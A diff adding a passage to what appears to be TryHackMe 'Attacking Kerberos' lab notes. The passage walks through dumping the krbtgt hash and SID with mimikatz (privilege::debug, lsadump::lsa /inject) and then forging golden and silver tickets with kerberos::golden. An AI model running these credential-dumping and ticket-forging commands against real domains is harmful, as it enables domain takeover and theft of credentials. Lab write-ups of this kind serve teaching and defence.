@@ -248,3 +248,13 @@ In order to fully understand how these attacks work you need to understand what 
 
 ### Golden/Silver Ticket Attack Overview - 
 A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
+
+### Dump the krbtgt hash -
+﻿1.) cd downloads && `mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz  
+2.) `privilege::debug` - ensure this outputs `[privilege '20' ok]`
+﻿3.) `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.  
+ <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_25.png" width="50%" height="50%">  
+
+ ### Create a Golden/Silver Ticket - 
+﻿1.) `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.
